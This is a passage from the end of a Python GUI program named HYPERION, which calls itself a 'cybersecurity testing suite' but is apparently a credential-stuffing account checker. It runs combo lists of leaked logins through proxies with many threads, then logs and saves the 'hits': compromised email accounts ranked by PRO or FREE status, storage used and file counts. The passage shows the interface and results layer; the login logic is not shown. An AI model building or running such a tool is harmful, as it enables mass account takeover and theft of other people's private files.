                    self.log_terminal("⏹️ Checking cancelled before start", "warning")
                    return
                    
                self.checker.check_combo_list(
                    self.combo_data,
                    use_proxies=use_proxies,
                    threads=threads,
                    delay_range=delay_range
                )
            except Exception as e:
                self.log_terminal(f"❌ Turbo error: {e}", "error")
            finally:
                # Ensure UI is reset even if there's an error
                if hasattr(self, 'start_btn'):
                    self.start_btn.configure(state="normal")
                if hasattr(self, 'stop_btn'):
                    self.stop_btn.configure(state="disabled")
        
        self.checking_thread = threading.Thread(target=run_turbo_checker, daemon=True)
        self.checking_thread.start()
    
    def update_enhanced_stats(self):
        """Update stats dashboard with enhanced metrics - use modern stats system"""
        # Use the modern stats update method instead
        self.update_modern_stats()
            
    def show_full_details(self):
        """Show comprehensive hits details viewer"""
        if not self.hits:
            self.log_terminal("📋 No hits found yet. Start checking to see detailed results.", "warning")
            return
            
        # Create a detailed summary
        self.log_terminal("📋 FULL DETAILS SUMMARY", "success")
        self.log_terminal("=" * 60, "info")
        
        total_hits = len(self.hits)
        pro_count = len([h for h in self.hits if h.account_type == 'PRO'])
        free_used = len([h for h in self.hits if h.account_type == 'FREE_USED'])
        free_empty = len([h for h in self.hits if h.account_type == 'FREE_EMPTY'])
        
        self.log_terminal(f"📊 Total Hits: {total_hits}", "info")
        self.log_terminal(f"💎 PRO Accounts: {pro_count}", "success")
        self.log_terminal(f"📁 FREE Used: {free_used}", "info")
        self.log_terminal(f"📂 FREE Empty: {free_empty}", "info")
        self.log_terminal("-" * 60, "info")
        
        # Show detailed hits with file/folder counts
        for i, hit in enumerate(self.hits[-10:], 1):  # Show last 10 hits
            file_count = getattr(hit, 'file_count', 0)
            folder_count = getattr(hit, 'folder_count', 0)
            
            details = f"[{i}] {hit.email} | {hit.account_type} | {hit.storage_used}"
            if file_count > 0 or folder_count > 0:
                details += f" | Files: {file_count} | Folders: {folder_count}"
            
            self.log_terminal(details, "success")
            
        if len(self.hits) > 10:
            self.log_terminal(f"... and {len(self.hits) - 10} more hits (check hits folder for complete details)", "info")
        
        # Show hits folder location
        if hasattr(self, 'hits_date_dir'):
            self.log_terminal(f"💾 Detailed hits saved to: {self.hits_date_dir}", "info")
        
        self.log_terminal("=" * 60, "info")
        
    def show_live_hits_viewer(self):
        """Show live hits viewer with categorized display"""
        self.log_terminal("👁️ LIVE HITS MONITORING", "success")
        self.log_terminal("=" * 50, "info")
        
        # Display live categorized hits
        pro_hits = [h for h in self.hits if h.account_type == 'PRO']
        free_files = [h for h in self.hits if h.account_type in ['FREE_USED', 'FREE_EMPTY'] and getattr(h, 'file_count', 0) >= 5]
        free_empty = [h for h in self.hits if h.account_type in ['FREE_USED', 'FREE_EMPTY'] and getattr(h, 'file_count', 0) < 5]
        
        self.log_terminal(f"💎 PRO ACCOUNTS ({len(pro_hits)}):", "success")
        for hit in pro_hits[-5:]:  # Last 5 PRO hits
            files = getattr(hit, 'file_count', 0)
            folders = getattr(hit, 'folder_count', 0)
            storage_info = f"{hit.storage_used}" if hasattr(hit, 'storage_used') else "Unknown"
            self.log_terminal(f"   └─ {hit.email} | {storage_info} | {files}F/{folders}D", "success")
            
        self.log_terminal(f"📁 FREE (≥5 FILES) ({len(free_files)}):", "info")
        for hit in free_files[-5:]:  # Last 5 FREE with files
            files = getattr(hit, 'file_count', 0)
            folders = getattr(hit, 'folder_count', 0)
            storage_info = f"{hit.storage_used}" if hasattr(hit, 'storage_used') else "Unknown"
            self.log_terminal(f"   └─ {hit.email} | {storage_info} | {files}F/{folders}D", "info")
            
        self.log_terminal(f"📂 FREE (<5 FILES) ({len(free_empty)}):", "info")
        for hit in free_empty[-5:]:  # Last 5 FREE empty
            files = getattr(hit, 'file_count', 0)
            folders = getattr(hit, 'folder_count', 0)
            storage_info = f"{hit.storage_used}" if hasattr(hit, 'storage_used') else "Unknown"
            self.log_terminal(f"   └─ {hit.email} | {storage_info} | {files}F/{folders}D", "info")
            
        if not self.hits:
            self.log_terminal("No hits found yet. Start checking to see live results here!", "warning")
            
        self.log_terminal("=" * 50, "info")

def main():
    """Main entry point"""
    print("""
██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ██╗ ██████╗ ███╗   ██╗
██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║██╔═══██╗████╗  ██║
███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║██║   ██║██╔██╗ ██║
██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗██║██║   ██║██║╚██╗██║
██║  ██║   ██║   ██║     ███████╗██║  ██║██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝

HYPERION v4.0 - Professional Cybersecurity Testing Suite
Starting application...
""")
    
    try:
        app = HYPERION()
        app.mainloop()
    except Exception as e:
        logger.error(f"Application failed to start: {e}")
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()